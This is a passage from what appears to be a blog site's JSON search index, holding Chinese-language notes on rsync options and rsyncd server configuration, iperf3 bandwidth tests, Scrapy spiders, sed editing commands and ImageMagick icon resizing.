归档模式，表示以递归方式传输文件，并保留所有文件属性，等于-rlptgoD\n        -r, --recursive       对子目录以递归模式处理\n        -l, --links           保留软链结\n        -p, --perms           保留文件权限\n        -t, --times           保留文件时间信息\n        -o, --owner           保留文件属主信息\n        -g, --group           保留文件属组信息\n        -D, --devices         保留设备文件信息    \n    -H, --hard-links      保留硬链结\n    -q, --quiet           精简输出模式\n    -c, --checksum        打开校验开关，强制对文件传输进行校验    \n    -R, --relative        使用相对路径信息\n    -b, --backup          创建备份，也就是对于目标已经存在同名文件时，将原先的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。\n    -u, --update          仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件。(不覆盖更新的文件)\n    -L, --copy-links      像对待常规文件一样处理软链结\n    -S, --sparse          handle sparse files efficiently  对稀疏文件进行特殊处理以节省 DST 的空间\n    -W, --whole-file      强制重传,不管有没有改变，再次把所有文件都传输一遍\n    -x, --one-file-system 不要跨越文件系统边界\n    -B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节\n    -C, --cvs-exclude     使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件\n    -I, --ignore-times    不跳过那些有同样的时间和长度的文件\n    -T --temp-dir=DIR     在DIR中创建临时文件\n    -z,--compress         对备份的文件在传输时进行压缩处理\n\n    --existing 只同步已经存在的文件，不创建新文件\n    --delete              删除那些DST中有而SRC没有的文件，即删除目标端中多余的文件；\n    --include=PATTERN     指定需要传输的文件模式      --include '.conf' \n    --exclude=PATTERN     指定不需要传输的文件模式    --exclude '' \n\n    --delete-excluded：专门指定一些要在目的端删除的文件。应该是说加了这个选项，不管有没有指定 excluded 也是会被删除。\n\n    --backup-dir          将备份文件(如~filename)存放在在目录下。\n    --suffix=SUFFIX       定义备份文件前缀\n    --copy-unsafe-links   仅仅拷贝指向SRC路径目录树以外的链结\n    --safe-links          忽略指向SRC路径目录树以外的链结\n    --rsync-path=PATH     指定远程服务器上的rsync命令所在路径信息\n    --existing            仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件\n    --delete-excluded     同样删除接收端那些被该选项指定排除的文件\n    --delete-after        传输结束以后再删除\n    --ignore-errors       及时出现IO错误也进行删除\n    --max-delete=NUM      最多删除NUM个文件\n    --partial             保留那些因故没有完全传输的文件，以是加快随后的再次传输\n    --force               强制删除目录，即使不为空\n    --numeric-ids         不将数字的用户和组ID匹配为用户名和组名\n    --timeout=TIME        IP超时时间，单位为秒\n    --size-only           当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间\n    --modify-window=NUM   决定文件是否时间相同时使用的时间戳窗口，默认为0\n    --compare-dest=DIR    同样比较DIR中的文件来决定是否需要备份\n    --progress            显示传输过程\n    --exclude-from=FILE   排除FILE中指定模式的文件\n    --include-from=FILE   不排除FILE指定模式匹配的文件\n    --version             打印版本信息\n    --address             绑定到特定的地址\n    --config=FILE         指定其他的配置文件，不使用默认的rsyncd.conf文件\n    --port=PORT           指定其他的rsync服务端口\n    --blocking-io         对远程shell使用阻塞IO\n    --stats               给出某些文件的传输状态\n    --progress            在传输时现实传输过程\n    --log-format=formAT   指定日志文件格式\n    --password-file=FILE  从FILE中得到密码\n    --bwlimit=KBPS        限制I/O带宽，KBytes per second\n\nRsync（remote synchronize）是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件，也可以使用 Rsync 同步本地硬盘中的不同目录。 在使用 rsync 进行远程同步时，可以使用两种方式：远程 Shell 方式（建议使用 ssh，用户验证由 ssh 负责）和 C/S 方式（即客户连接远程 rsync 服务器，用户验证由 rsync 服务器负责）。rsync 被称为是一个文件同步的快速方法，主要是因为其在同步文件时会检查文件之间是否有差异，它只同步存在差异或者不存在的文件，但是首次同步时速度依然很慢。\n\nrsync有许多选项：\n    -n: 在不确定命令是否能按意愿执行时，务必要事先测试；-n可以完成此功能；\n    -a: --archives，归档模式，表示以递归方式传输文件，并保持所有文件属性，等于 -rlptgoD\n        -r: --recursive，递归复制；\n        -l: --links 保留文件的符号链接\n        -p: --perms 保留文件的权限\n        -t: --times 保留文件的时间戳\n        -g: --group 保留文件的属组\n        -o: --owner 保留文件的属主\n        -D： --devices 保留设备文件\n    -v: --verbose，详细输出模式\n    -z: --compress，对文件压缩后传输\n    -e ssh: 表示使用ssh协议作承载\n    -H, --hard-links 保留硬链结;\n    -P: --partial --progress 断点续传\n    -W:  强制重传,不管有没有改变，再次把所有文件都传输一遍\n    -q: --quiet，静默模式\n    -c: --checksum，开启校验功能，强制对文件传输进行校验\n\n    -S, --sparse 对稀疏文件进行特殊处理以节省DST的 空间;\n    --progress：显示进度条\n    --stats: 显示如何执行压缩和传输 ，可以显示有多少文件需要同步，需要传输的具体容量\n    --existing 只同步已经存在的文件，不创建新文件\n    默认的情况下，当rsync传输中断后，新的rsync传输将删除所有的未完成的残余文件片段，然后开始新的传输。而使用--partial后，将会进行我们所说的断点续传。\n    值得注意的是-P这个参数是综合了--partial --progress两个参数，所以rsync的断点续传可以\n带你走进rsync的世界带你走进rsync的世界\n\n 使用 rsync 同步的时候，可否指定 ssh 的端口号？\n在 ~/.ssh/config 里面指定该Host的端口\nHost remotehost\n  Port 2345\nrsync + ssh 使用不同 port 執行\n\nrsync + ssh 使用不同 port 的話, 需要加上 -e \"ssh -p portnumber\", ex: 假設遠端的 ssh 機器是用 1234 port, 指令會如下述:\n\n    rsync -e \"ssh -p 1234\" -avz --bwlimit=3000 REMOTEHOST:datapath .\n\n另一種使用 --rsh='ssh -pPORTNUMBER', 如下述範例:\n\n    rsync --rsh='ssh -p1234' -avz --bwlimit=3000 REMOTEHOST:datapath .\n\n另外一個是透過 .ssh/config, 做 ssh 遠端機器的相關設定, 如下述範例:\n\n    vim .ssh/config\n    Host REMOTEHOST # 這個可以寫簡寫, 但是下面 rsync 的REMOTEHOST 需與此一致.\n    HostName REMOTEHOST\n    User YOURUSERNAME\n    Port 1234\n    IdentityFile /home/YOURUSERNAME/.ssh/idrsa # 如果有在寫, 沒有這行可跳過不寫\n    rsync -avz --bwlimit=3000 REMOTEHOST:datapath . # 這邊就可以直接 rsync 即可.\n\nrsync -av keyicloud.com:/var/www/www-data/yimeng  /home/feiyu/\n二，rsync使用方法\n\nrsync可以在此处下载   http://rsync.samba.org/  ，CentOS系统上rsync默认是安装的。\n\nrsync有 六种 不同的工作模式： 单个\":\" ssh 模式； 两个\"::\" rsyncd 服务模式\n拷贝本地文件\n\n当SRC和DES路径信息都不包含有单个冒号”:”分隔符时就启动这种工作模式。\n\n[root@localhost ~]# rsync -avSH /home/feiyu/ /bak/\n\n2.将本地机器的内容拷贝到远程机器\n使用一个远程shell程序（如rsh、ssh）来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号”:”分隔符时启动该模式。\n[root@localhost ~]# rsync -av /home/feiyu/ 192.168.0.24:/home/feiyu/\n\n3.将远程机器的内容拷贝到本地机器\n使用一个远程shell程序（如rsh、ssh）来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号”:”分隔符时启动该模式。\n[root@localhost ~]# rsync -av 192.168.0.24:/home/feiyu/  /home/feiyu/\n\n注意：rsync命令使用中，如果源参数的末尾有斜线，就会复制指定目录的内容，而不复制目录本身；没有斜线，则会复制目录本身；目标参数末尾的斜线没有作用；因此下面的命令\n[root@localhost ~]# rsync -r /mydata/data /backups/ : 会把目录data直接同步至/backups目录中\n[root@localhost ~]# rsync -r /mydata/data/ /backups/: 会把目录data/中的内容的同步至/backups目录中\n[ ] rsync -av ck/ root@qubuluo.com:       $PWD/ck/ --  /root/\n[x] rsync -av ck  root@qubuluo.com:       $PWD/ck/ --  /root/ck/\n[x] rsync -av ck/ root@qubuluo.com:ck     $PWD/ck/ --  /root/ck/\n[ ] rsync -av ck  root@qubuluo.com:ck     $PWD/ck/ --  /root/ck/ck/\n后面三种模式都是在rsync作为服务器时才能使用的，下面就开始配置rsync作为一个服务。\n三，配置rsync服务\n\n配置一个简单的rsync服务并不复杂，但是我们安装好rsync后，并没有发现配置文件，所以你需要手动建立一些配置文件。rsync可以经由xinetd启动daemon，或者作为一个独立进程启动daemon。如果把它作为一个独立进程来启动，只需要运行命令：rsync –daemon即可；但是我们一般将其作为超级守护进程使用。下面是安装步骤：\n1.安装并启动xinetd\n\n[root@localhost ~]# yum -y install xinetd\n\n[root@localhost ~]# ls  /etc/xinetd.d/    #rsync的xinetd配置文件已经存在\nchargen-dgram   daytime-dgram   discard-dgram   echo-dgram   rsync          time-dgram\nchargen-stream  daytime-stream  discard-stream  echo-stream  tcpmux-server  time-stream\n\n为rsync服务提供配置文件\n\n配置文件为/etc/rsyncd.conf，获取帮助的方式：man rsyncd.conf。配置文件需要定义一个全局配置和多个rsync共享配置。\n\n[root@localhost ~]# cat  /etc/rsyncd.conf\nGlobal Settings\n port = 873   端口号默认为873，可以不指定\nuid = nobody  //指定当模块传输文件的守护进程UID\ngid = nobody  //指定当模块传输文件的守护进程GID\nuse chroot = no  //使用chroot到文件系统中的目录中\nmax connections = 5   //最大并发连接数\nstrict modes = yes      #严格检查文件权限\npid file = /var/run/rsyncd.pid  //指定PID文件\nlock file = /usr/local/rsyncd/rsyncd.lock  //指定支持max connection的锁文件，默认为/var/run/rsyncd.lock\nlog file = /var/log/rsyncd.log  //rsync 服务器的日志\n\nDirectory to be synced\n[mydata]          //自定义模块\npath = /mydata/data    //用来指定要备份的目录\nignore errors = yes    //可以忽略一些IO错误\nread only = no  //设置no，客户端可以上传文件，yes是只读\nwrite only = no  //no为客户端可以下载，yes 不能下载\nhosts allow = 192.168.0.0/16  //可以连接的IP\nhosts deny =    //禁止连接的IP\nlist = false       //客户请求时，使用模块列表\nuid = root\ngid = root\nauth users = myuser   //连接用户名，和linux系统用户名无关系\nsecrets file = /etc/rsyncd.passwd\t//验证密码文件\n\n说明（deny | allow 规则）：\n1、二者都不出现时，默认为允许访问；\n2、只出现hosts allow: 定义白名单；但没有被匹配到的主机由默认规则处理，即为允许；\n3、只出现hosts deny： 定义黑名单；出现在名单中的都被拒绝；\n4、二者同时出现：先检查hosts allow，如果匹配就allow，否则，检查hosts deny，如果匹配则拒绝；如二者均无匹配，则由默认规则处理，即为允许；\n3.创建密码文件\n\n文件格式(明文)： username : password\n\n[root@localhost ~] echo \"myuser:mypass\"   /etc/rsyncd.passwd\n\n[root@localhost ~]# chmod 600 /etc/rsyncd.passwd     #权限必须为600\n\n4.启动服务\n\n[root@localhost ~]# service xinetd  start\n\n5.使用方法 ( 后三种模式 )\n\na. 从远程rsync服务器中拷贝文件到本地机。当SRC路径信息包含”::”分隔符时启动该模式。\n\n[root@localhost ~]# rsync -av myuser@192.168.0.23::mydata /tmp/     #myuser为rsync服务器的一个用户\n\nb. 从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含”::”分隔符时启动该模式。\n\n[root@localhost ~]# rsync -av install.log.syslog  myuser@192.168.0.23::mydata\n\nc. 列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。\n\n[root@localhost ~]# rsync -av myuser@192.168.0.23::mydata\n\nyum install rsync\n\n创建rsyncd服务的配置文件\n\n默认安装后，在/etc目录下，并不存在rsyncd目录，需要手动创建配置文件目录\n\nmakdir /etc/rsyncd\n\n在/etc/rsyncd目录下创建如下文件\n\ntouch /etc/rsyncd/rsyncd.conf          #主配置文件\ntouch /etc/rsyncd/rsyncd.secrets       #用户名密码文件，一组用户一行，用户名和密码使用 : 分割\ntouch /etc/rsyncd/rsyncd.motd          #非必须，连接上rsyncd显示的欢迎信息，此文件可不创建\n\n必须注意的是，rsyncd服务的密码文件权限必须是600\n\nchmod 0600 /etc/rsyncd/rsyncd.secrets\n\n编辑主配置文件 rsyncd.conf\n######################################################################################################\n***进程相关全局配置**\n################################################################################################\n= 后面的值可根据自己的实际情况更改\n    pid file 守护进程pid文件\nport 守护进程监听端口，可更改，由xinetd允许rsyncd时忽略此参数\n    address 守护进程监听ip，由xinetd允许rsyncd时忽略此参数\npid file = /usr/local/var/run/rsyncd.pid\nport = 873\naddress = 192.168.1.2\nrsyncd 守护进程运行系统用户全局配置，也可在具体的块中独立配置,\nuid = root\ngid = root\n允许 chroot，提升安全性，客户端连接模块，首先chroot到模块path参数指定的目录下\nchroot为yes时必须使用root权限，且不能备份path路径外的链接文件\nuse chroot = yes\n只读\nread only = no\n只写\nwrite only = no\n允许访问rsyncd服务的ip，ip端或者单独ip之间使用空格隔开\nhosts allow = 192.168.0.1/255.255.255.0 198.162.145.1 10.0.1.0/255.255.255.0\n不允许访问rsyncd服务的ip，是全部(不涵盖在hosts allow中声明的ip，注意和hosts allow的先后顺序)\nhosts deny = \n客户端最大连接数\nmax connections = 5\n欢迎文件路径，可选的\nmotd file = /etc/rsyncd/rsyncd.motd\n日志相关\n    log file 指定rsync发送消息日志文件，而不是发送给syslog，如果不填这个参数默认发送给syslog\ntransfer logging 是否记录传输文件日志\n    log format 日志文件格式，格式参数请google\nsyslog facility rsync发送消息给syslog时的消息级别，\n    timeout连接超时时间\nlog file = /usr/local/logs/rsyncd.log\ntransfer logging = yes\nlog format = %t %a %m %f %b\nsyslog facility = local3\ntimeout = 300\n\n######################################################################################################\n**模块配置(多个)***\n################################################################################################\n模块 模块名称必须使用[]环绕，比如要访问data1,则地址应该是data1user@192.168.1.2::data1\n[data1]\n模块根目录，必须指定\npath=/home/username\n是否允许列出模块里的内容\nlist=yes\n忽略错误\nignore errors\n模块验证用户名称，可使用空格或者逗号隔开多个用户名\nauth users = data1user\n模块验证密码文件 可放在全局配置里\nsecrets file=/etc/rsyncd/rsyncd.secrets\n注释\ncomment = some description about this moudle\n排除目录，多个之间使用空格隔开\nexclude = test1/ test2/\n可以直接copy上述内容，作为自己rsyncd服务的配置模板\n\n启动rsyncd服务\n\n    rsyncd 服务负载比较高的时候，设定rsyncd为独立的守护进程\n\n默认配置文件是/etc/rsyncd.conf，所以需要显式的指定配置文件\n/usr/bin/rsync --daemon --config=/etc/rsyncd/rsyncd.conf\n假设使用putty，xshell终端操作,保证终端断开进程仍然执行\nnohup /usr/bin/rsync --daemon --config=/etc/rsyncd/rsyncd.conf\n\n为了保证开机时自动启动，需要手动加上面的命令(/usr/bin/rsync --daemon --config=/etc/rsyncd/rsyncd.conf)加入 /etc/rc.local 文件中\n如果服务器开启了防火墙，必须保证端口能穿过防火墙\n\niptables -A INPUT -p tcp -m state --state NEW  -m tcp --dport 873 -j ACCEPT\n\n端口号修改为实际端口号即可\n\n    rsyncd 使用xinetd运行\n    xinetd的rsync配置文件是/etc/xinetd.d/rsync\n    需要编辑此文件修改一个参数,显式的指定rsyncd服务的配置文件\n\nserver_args     = --daemon --config=/etc/rsyncd/rsyncd.conf\n\n注意系统如果没有安装xinetd，需要 yum intall xinetd\n\nchkconfig rsync on\nservice xinetd restart\n\n使用rsync传输数据\n\n示例1:\n\nrsync -avzP data1user@192.168.1.2::data1 ~/data1\n\n保持传输原有文件权限，用户，用户组，时间，递归的把data1模块数据复制到用户家目录的data1目录里，\n参数 a的意思就是 保留文件原有权限，用户，用户组，时间且递归的copy包括链接文件，块设备在内的所有文件，这个参数很常用\n参数 v是显示传输信息\n参数 P显示传输进度\n参数 z是压缩传输内容进行传输\n\n假设要保持data1模块和用户家目录模块内容完全一致,加上参数 --delete,这样会删除在~/data1目录里但是不在data1模块里的文件(夹)\n\nrsync -avzP --delete data1user@192.168.1.2::data1 ~/data1\n\n示例2：\n\nrsync -avzP --delete --password-file=/~/rsync/data1.secrets data1user@192.168.1.2::data1 ~/data1\n\n传输时自动使用密码文件而不用手动输入，注意密码文件权限必须是600","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 iperf3 带宽测试 ","title":"iperf3","text":"sudo apt install iperf3\nperf的主要功能：\n1）TCP方面\n测试网络带宽\n支持多线程，在客户端和服务端支持多重连接\n报告MSS/MTU值的大小\n支持TCP窗口值自定义并可通过套接字缓冲\n2)UDP方面\n可设置指定带宽的UDP数据流\n可以测试网络抖动值、丢包数\n支持多播 测试\n支持多线程，在客户端和服务端支持多重连接\n安装：\ntar -xzvf iperf-3.1b3.tar.gz\ncd iperf-3.1b3/\n./configure\nmake\nmake install\n应用实例：\n1）测试TCP吞吐量 [带宽测试]\n服务端：\niperf3 -s\n客户端：\niperf3 -c 192.168.17.142\n\niperf默认运行时间10s，每隔1s输出一次传输状态，同时还可以看到每秒传输的数据量在50~80M之间（我的是虚拟机环境）\n刚好与Bandwidth列的值对应起来，网卡的带宽平均速率维持在500Mbits/sec\n改变iperf运行时间和输出频率：-t 和-i 参数来实现\niperf3 -c 192.168.17.142 -t 20 -i 5\n\n 模拟大量数据传输：-n指定传输的数据量\niperf3 -c 192.168.17.142 -i 10 -n 5000000000\n\n模拟TCP一个特定文件发送数据：-F\niperf3 -c 192.168.17.142 -F test.dbf -i 5 -t 40\n\n 将结果输出都以MBytes/sec来显示： -f M\niperf3 -c 192.168.17.142 -n 2000000000 -i 5 -f M\n\n多线程：-P\niperf3 -c 192.168.17.142 -n 2000000000 -i 5 -f M -P 2\n\n 测试UDP丢包和延迟\nSUSE01:/soft # iperf3 -c 192.168.17.142 -u -b 100M -f M -i 3","tags":null},{"location":"//blog.pytool.com/Post/scrapy/2014-04-29-scrapy-Spiders","title":"scrapy Spiders","text":"原文地址：http://doc.scrapy.org/en/latest/topics/spiders.html\n\n蜘蛛爬行过程大体如下：\n\n 以给起始URLs生成requests开始，并给这些requests指定回调函数，当response下载完后，调用回调函数。\n 第一个request是通过调用startrequests()方法取得。startrequests()默认情况下会给指定在starturls里的URL生成request，并将parse方法作为request的回调函数。\n 在回调函数中，你解析response并返回item 对象或者request对象或者an iterable of both 。这些request对象同样也会包含回调函数（可以是一样的），接下来，scrapy会发起这些请求，并用指定的回调函数处理response。\n 在回调函数中，解析网页内容，通常使用Selectors(你也可使用BeautifulSoup, lxml 或其它你想用的),并用提取的数据生成item。\n 最后蜘蛛返回的这些items通常会被存到数据库（用一些item pipeline ）或用Feed export写到文件中。\n\nspider arguments\n蜘蛛可以接受参数用来改变它们的行为。参数常用来限制蜘蛛爬取某一板块的内容。但其实，参数可以用来配置蜘蛛所有的功能。\n\nspider arguments 通过crawl命令的-a选项传递，例如：\n\n    scrapy crawl myspider -a category=electronics\n\nspider会在它们的构造函数里接收参数：\n\n\timport scrapy\n\n\tclass MySpider(scrapy.Spider):\n    \tname = 'myspider'\n\n    \tdef init(self, category=None, args, kwargs):\n        \tsuper(MySpider, self).init(args, **kwargs)\n        \tself.starturls = ['http://www.example.com/categories/%s' % category]\n        \t ...\n\n也可以通过Scrapyd schedule.json API 传递参数。参见Scrapyd。\n\n内建蜘蛛\nscrapy提供了很多通用蜘蛛，你可以直接从它们继承。\n下面的例子假定你有一个项目，且在myproject.items 模块下有TestItem定义：\n\n\timport scrapy\n\n\tclass TestItem(scrapy.Item):\n    \tid = scrapy.Field()\n    \tname = scrapy.Field()\n    \tdescription = scrapy.Field()\n\nSpider\n\n\tclass scrapy.spider.Spider\n\n该类是所有蜘蛛的父类，不论是scrapy自带的还是你自己写的蜘蛛，最终都需要继承于此类。它并不提供任何特殊的功能，只是请求给定的starturl/startrequests，等response后调用回调函数解析response。\n\n name蜘蛛的名字。scrapy用名字来定位蜘蛛，所以它必须唯一。但是对于一个蜘蛛类你可以实例化多个实例。名字通常为域名。\n alloweddomains可选的域名列表。如果OffsiteMiddleware启用的话，那么不属于这个域名列表里的requests和URLs都不会被跟踪。\n starturls当没有指定特定的URL时，蜘蛛会从这个URLs列表开始爬取。接下来的链接会从start URLs对应的页面中生成。\n startrequests()该方法必须返回一个iterable。只有当没有指定特定URLs时才会调用该方法。如果指定了特定URL，那么makerequestsfromurl(url)会被调用。\n\n\t该方法只会被scrapy调用一次，所以将它实现为一个生成器是安全的。默认的实现是：为每个starturls里的链接调用makerequestsfromurl(url)生成request。\n\t如果你想改变初始request，这个方法就是需要被重写的。例如：你需要先POST request 来登录，可以这么做：\n\n\t  \tdef startrequests(self):\n\t\t  \treturn [scrapy.FormRequest(\"http://www.example.com/login\",\n                               formdata={'user': 'john', 'pass': 'secret'},\n                               callback=self.loggedin)]\n\n\t  \tdef loggedin(self, response):\n\t\t  \t# here you would extract links to follow and return Requests for\n\t\t  \t# each of them, with another callback\n\t\t  \tpass\n\n makerequestsfromurl(url)该方法接受一个url,返回一个Request对象（或者一个request对象列表）用来爬取。在startrequests()中，它被用来构建初始request。它通常被用来将url转换为request。\n 除非被重写，否则该方法返回request，并把parse()函数作为其回调函数。\n parse(response)当没有指定别的回调函数时，该方法是默认的用来处理response的回调函数。\n 该方法处理response，返回提取的数据和/或更多的URL。其它的Request的毁掉函数也必须如此。必须返回iterable request and/ or item objects.\n\n\t Parameters:response (:class:~scrapy.http.Response`) – the response to parse\n\nlog(message[,level,component])使用scrapy.log.msg()函数log。\nclosed(reason)蜘蛛关闭时被调用。 This method provides a shortcut to signals.connect() for the spiderclosed signal.\n\n示例：\n\n\timport scrapy\n\n\tclass MySpider(scrapy.Spider):\n    \tname = 'example.com'\n    \talloweddomains = ['example.com']\n    \tstarturls = [\n        \t'http://www.example.com/1.html',\n        \t'http://www.example.com/2.html',\n        \t'http://www.example.com/3.html',\n    \t]\n\n    \tdef parse(self, response):\n        \tself.log('A response from %s just arrived!' % response.url)\n\n下面是,从一个回调函数中返回多个Requests 和Item的例子：\n\n\timport scrapy\n\tfrom myproject.items import MyItem\n\n\tclass MySpider(scrapy.Spider):\n    \tname = 'example.com'\n    \talloweddomains = ['example.com']\n    \tstarturls = [\n        \t'http://www.example.com/1.html',\n        \t'http://www.example.com/2.html',\n        \t'http://www.example.com/3.html',\n    \t]\n\n    \tdef parse(self, response):\n        \tfor h3 in response.xpath('//h3').extract():\n            \tyield MyItem(title=h3)\n\n        \tfor url in response.xpath('//a/@href').extract():\n            \tyield scrapy.Request(url, callback=self.parse)\n\nCrawlSpider\n\n\tclass scrapy.contrib.spiders.CrawlSpider\n\n这是最常用的蜘蛛，因为它提供了一种方便的机制用来跟踪链接，只需定义一系列规则。除了从Spider继承的属性外，它还新增了一个属性：\n\n rules一系列Rule对象。每个Rule对象定义了一种确定的行为。当同一个链接符合多条规则时，会使用第一条。\n\n它还新增一个可重写的方法：\n\n parsestarturl(response)这个方法会在starturl response 后调用。用来解析初始response，但它也必须返回item 对象或Request对象，或包含它们的iterable\n\nCrawling rules\n\n\tclass scrapy.contrib.spiders.Rule(linkextractor, callback=None, cbkwargs=None, follow=None, processlinks=None, processrequest=None)\n\n linkextractor是Link Extractor对象，定义了如何从每个爬取的页面中提取链接。\n callbackis a callable or a string（函数名）在指定的linkextractor提取连接后调用。该回调函数接受一个response作为第一个参数，它必须返回一个包含item and/or request 对象的列表。\n 注意：当写蜘蛛规则时，不要使用parse作为回调函数，因为CrawlSpider本身用到parse来实现自身逻辑。所以一旦你重写了parse函数，蜘蛛就不能正常工作了。\n cbkwargs包含关键词参数的字典，会被传递给回调函数。\n follow布尔值。用来指定是否跟踪当前规则提取到的链接。如果没有指定回调函数，那么默认为true,否则默认为false。\n processlinksis a callable, or a string。用来过滤提取到的链接\n processrequestis a callable, or a string。用来过滤request\n\n示例：\n\n\timport scrapy\n\tfrom scrapy.contrib.spiders import CrawlSpider, Rule\n\tfrom scrapy.contrib.linkextractors import LinkExtractor\n\n\tclass MySpider(CrawlSpider):\n    \tname = 'example.com'\n    \talloweddomains = ['example.com']\n    \tstarturls = ['http://www.example.com']\n\n    \trules = (\n        \t# Extract links matching 'category.php' (but not matching 'subsection.php')\n        \t# and follow links from them (since no callback means follow=True by default).\n        \tRule(LinkExtractor(allow=('category\\.php', ), deny=('subsection\\.php', ))),\n\n        \t# Extract links matching 'item.php' and parse them with the spider's method parseitem\n        \tRule(LinkExtractor(allow=('item\\.php', )), callback='parseitem'),\n    )\n\n    \tdef parseitem(self, response):\n        \tself.log('Hi, this is an item page! %s' % response.url)\n        \titem = scrapy.Item()\n        \titem['id'] = response.xpath('//td[@id=\"itemid\"]/text()').re(r'ID: (\\d+)')\n        \titem['name'] = response.xpath('//td[@id=\"itemname\"]/text()').extract()\n        \titem['description'] = response.xpath('//td[@id=\"itemdescription\"]/text()').extract()\n        \treturn item\n\nXMLFeedSpider\nCSVFeedSpider\nSitemapSpider","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 sed","title":"Linux命令 sed","text":"---\n\n简介\nsed是非交互式的编辑器。它不会修改文件，除非使用shell重定向来保存结果。默认情况下，所有的输出行都被打印到屏幕上。\nsed编辑器逐行处理文件（或输入），并将结果发送到屏幕。具体过程如下：首先sed把当前正在处理的行保存在一个临时缓存区中（也称为模式空间），然后处理临时缓冲区中的行，完成后把该行发送到屏幕上。sed每处理完一行就将其从临时缓冲区删除，然后将下一行读入，进行处理和显示。处理完输入文件的最后一行后，sed便结束运行。sed把每一行都存在临时缓冲区中，对这个副本进行编辑，所以不会修改原文件。\nSed 命令地址匹配问题总结\n\nsed使用参数\n[root@www ~] sed [-nefr] [动作]\n\n命令行参数：\n-e ：多点编辑\n-i --in-place ：直接修改文件内容((危险动作))，而不是输出到终端。\n-E -r --regexp-extended ：sed 的动作支持的是延伸型正规表示法的语法。(默认是基础正规表示法语法)\n-n ：加上 -n 参数后，则只有经过sed 特殊处理的那一行(或者动作)才会被列出来。\n1. 定址\n1，3表示1，2，3行，美元符号($)表示最后一行。\n 2. 定界符/分隔符\n  sed s后加@,#,$ / 分隔符\n\n  echo this is a test line | sed 's/\\w\\+/[\u0026]/g'\n  [this] [is] [a] [test] [line]\n\ns命令后面的第一个字段就是定界符,可以使用任意字符作为定姐夫@,#,$ / ：| +\nsed 只替换匹配中的内容\n\\w\\+ 匹配每一个单词        \n\u0026    对应于之前所匹配到的单词\n^   从开头匹配\n.  匹配任意字符\n#  匹配#后面连续多个空格\n\n定界符\n1、空(默认)：表示在全文范围\n2、单地址：\n　　n：指定行；\n　　/pattern/：被此模式所匹配到的每一行；\n3、地址范围：\n　　n,N：从起始行到结束行\n　　n,+N：从第起始行，向后数多少行\n　　n,/par1/：从起始行到pat1第一次匹配到的行\n　　/pat1/,/pat2/：从pat1第一次匹配到的行到pat2第一次匹配到的行\n　　$：最后一行\n命令: 组合命令{} 命令分隔 ;\n模式空间(pattern space): [操作区,命令行]\na ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～\ni ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；\nc ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！\nd ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；\np ：列印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～\n\nr : /PATH/FROM/FILE：读取指定文件的内容，追加到当前模式空间后面\n= ：显示行号                                           sed -n '/music/=' quote.txt\n! ：命令前加!,给定界符取反，不在定界范围内才执行命令\ns ：替换，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！\n      修饰标记：\n       /g：全局替换，没有此标记，只替换正则匹配到的第一项\n       /w /PATH/TO/FILE：将替换后的内容保存一份至指定文件\n       /p：将替换成功的内容送至标准输出\n\nn ：读取文件下一行到[pattern]模式空间中\nN ：读取文件下一行追加到[pattern]模式空间中\nd ：删除模式空间中的行\nD ：删除模式空间中的所有行\n\n保持空间(hold space): 缓冲区\nsed每次执行时还拥有一个保持空间(hold space)缓冲区,用来临时保存内容，开始时默认是一个空行。\n保持空间用于保存模式空间的内容，模式空间的内容可以复制到保持空间，同样地保持空间的内容可以复制回模式空间。sed提供了几组命令用来完成复制的工作，其它命令无法匹配也不能修改模式空间的内容\nH: 保存（Hold) \th/H \t将[模式空间pattern]的内容copy或者append到[保持空间hold --缓存区]\nG: 取回（Get） \tg/G \t将[保持空间hold]的内容copy或者append到[模式空间pattern]\nx: 交换（Exchange） \tx \t交换模式空间和保持空间的内容\n\n一、标签文本编辑的一点心得--sed篇\nb label ,无条件跳转到标签label,如果label没有指定,跳转到命令的结尾\nt label ,如果最后一次输入的最后一个 s/// 子命令执行成功,跳转到标签label,如果label没有指定,跳转到命令的结尾\n:a                   #定义标签a\n$!N                  #不是最后一行，执行N命令\n/ms$/s/\\n/ /         #如果以ms结尾，将\\n替换为空格\nta                   #如果s///命令执行成功，跳转到标签a处\nP                    #打印pattern space的第一行\nD                    #删除pattern space的第一行，循环\n\n正则匹配：\n^ 行的开始 如：/^sed/匹配所有以sed开头的行。   \n$ 行的结束 如：/sed$/匹配所有以sed结尾的行。   \n. 匹配一个非换行符的字符 如：/s.d/匹配s后接一个任意字符，然后是d。   \n匹配零或多个字符 如：/ *sed/匹配所有模板是一个或多个空格后紧跟sed的行。  \n[] 匹配一个指定范围内的字符，如/[Ss]ed/匹配sed和Sed。  \ned/匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行。  \n\\(..\\) 保存匹配的字符，如s/\\(love\\)able/\\1rs，loveable被替换成lovers。  \n\u0026 保存搜索字符用来替换其他字符，如s/love/\u0026/，love这成love。\n  用来精确匹配一个单词 sed -n '/\\acc=701\\/'p\n\\\u003c 锚定单词的开始，如:/\\","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 ImageMagick","title":"Linux命令 ImageMagick","text":"ImageMagick常用指令详解 - 牛奶、不加糖 - 博客园\nImageMagicK 图片尺寸转换 - pjw0221的专栏 - 博客频道 - CSDN.NET\n\nyairc -a ym.png 产生ios图标\n生成 应用宝上传图标\nconvert -resize 16x16 文件名 favicon.ico 应用小图标16x16\nconvert -resize 16x16 文件名 qq-small-@16x16.png #应用小图标16x16\nconvert -resize 512x512 文件名 qq-@512x512.png  